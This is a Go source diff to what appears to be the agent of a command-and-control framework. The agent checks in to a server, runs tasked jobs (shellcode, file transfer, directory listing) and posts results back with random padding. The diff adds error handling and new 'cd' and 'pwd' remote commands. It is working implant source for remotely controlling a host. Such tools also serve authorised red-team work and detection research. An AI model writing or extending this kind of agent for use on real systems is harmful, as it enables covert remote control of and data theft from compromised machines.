@@ -277,6 +277,7 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
 		}
+		return false
 	}
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
@@ -350,6 +351,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
 		}
+		return
 	}
 
 	if a.Verbose {
@@ -575,6 +577,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
 						err1.Error()))
 				}
+				break
 			}
 			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
 			if respErr != nil {
@@ -582,6 +585,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", "There was an error sending the FileTransfer message to the server")
 					message("warn", fmt.Sprintf("%s", respErr.Error()))
 				}
+				break
 			}
 			if resp2.StatusCode != 200 {
 				if a.Verbose {
@@ -627,6 +631,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
 						"message:\r\n%s", err3.Error()))
 				}
+				break
 			}
 			if a.Verbose {
 				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
@@ -758,7 +763,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
 							err1.Error()))
 					}
-					break //don't try and sent POST with broken/empty json
+					break
 				}
 				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
 				if respErr != nil {
@@ -766,7 +771,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", "There was an error sending the FileTransfer message to the server")
 						message("warn", fmt.Sprintf("%s", respErr.Error()))
 					}
-					break //resolves crash on error
+					break
 				}
 				if resp2.StatusCode != 200 {
 					if a.Verbose {
@@ -938,6 +943,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			if a.Verbose {
 				if errEncode != nil {
 					message("warn", fmt.Sprintf("There was an error encoding the JSON message\r\n%s", errEncode.Error()))
+					break
 				} else {
 					message("note", fmt.Sprintf("Sending response to server: %s", so))
 				}
@@ -955,6 +961,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
 					message("warn", errPost.Error())
 				}
+				break
 			}
 
 			if resp2.StatusCode != 200 {
@@ -978,6 +985,9 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				var se string
 				if err != nil {
 					se = err.Error()
+					if a.Verbose {
+						message("warn", fmt.Sprintf("ls command returned STDERR: %s", err.Error()))
+					}
 				}
 
 				c := messages.CmdResults{
@@ -988,7 +998,10 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 
 				k, err := json.Marshal(c)
 				if err != nil {
-					panic(err)
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
+							"ls command:\r\n%s", err.Error()))
+					}
 				}
 
 				g := messages.Base{
@@ -1005,6 +1018,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
 							" ls command results:\r\n%s", err6.Error()))
 					}
+					break
 				}
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", listing))
@@ -1023,10 +1037,128 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							resp2.StatusCode))
 					}
 				}
-			}
-		default:
-			if a.Verbose {
-				message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
+			case "cd":
+				var se string
+				var stdout string
+				err := os.Chdir(p.Args)
+				if err != nil {
+					se = err.Error()
+					if a.Verbose {
+						message("warn", fmt.Sprintf("cd command returned STDERR: %s", err.Error()))
+					}
+				} else {
+					path, pathErr := os.Getwd()
+					if pathErr != nil {
+						se = pathErr.Error()
+					} else {
+						stdout = fmt.Sprintf("Changed working directory to %s", path)
+					}
+				}
+
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: stdout,
+					Stderr: se,
+				}
+
+				k, err := json.Marshal(c)
+				if err != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
+							"ls command:\r\n%s", err.Error()))
+					}
+				}
+
+				g := messages.Base{
+					Version: 1.0,
+					ID:      j.ID,
+					Type:    "CmdResults",
+					Payload: (*json.RawMessage)(&k),
+					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+				}
+				b2 := new(bytes.Buffer)
+				err7 := json.NewEncoder(b2).Encode(g)
+				if err7 != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err7.Error()))
+					}
+					break
+				}
+				if a.Verbose {
+					message("note", fmt.Sprintf("Sending response to server: %s", stdout))
+				}
+				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
+				if errPost != nil {
+					if a.Verbose {
+						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
+						message("warn", errPost.Error())
+					}
+					break
+				}
+				if resp2.StatusCode != 200 {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+					}
+				}
+			case "pwd":
+				var se string
+				dir, err := os.Getwd()
+				if err != nil {
+					se = err.Error()
+					if a.Verbose {
+						message("warn", fmt.Sprintf("pwd command returned STDERR: %s", err.Error()))
+					}
+				}
+
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: fmt.Sprintf("Current working directory: %s", dir),
+					Stderr: se,
+				}
+
+				k, err := json.Marshal(c)
+				if err != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
+							"ls command results:\r\n%s", err.Error()))
+					}
+				}
+
+				g := messages.Base{
+					Version: 1.0,
+					ID:      j.ID,
+					Type:    "CmdResults",
+					Payload: (*json.RawMessage)(&k),
+					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+				}
+				b2 := new(bytes.Buffer)
+				err8 := json.NewEncoder(b2).Encode(g)
+				if err8 != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err8.Error()))
+					}
+					break
+				}
+				if a.Verbose {
+					message("note", fmt.Sprintf("Sending response to server: %s", dir))
+				}
+				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
+				if errPost != nil {
+					if a.Verbose {
+						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
+						message("warn", errPost.Error())
+					}
+					break
+				}
+				if resp2.StatusCode != 200 {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+					}
+				}
+			default:
+				if a.Verbose {
+					message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
+				}
 			}
 		}
 	}
@@ -1206,6 +1338,7 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the agentInfo JSON message:\r\n%s", err.Error()))
 		}
+		return
 	}
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
@@ -1248,13 +1381,19 @@ func (a *Agent) list(path string) (string, error) {
 	} else if a.Verbose {
 		message("success", fmt.Sprintf("listing directory contents for: %s", path))
 	}
-	files, err := ioutil.ReadDir(path)
+
+	// Resolve relative path to absolute
+	aPath, errPath := filepath.Abs(path)
+	if errPath != nil {
+		return "", errPath
+	}
+	files, err := ioutil.ReadDir(aPath)
 
 	if err != nil {
 		return "", err
 	}
 
-	details := ""
+	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)
 
 	for _, f := range files {
 		perms := f.Mode().String()
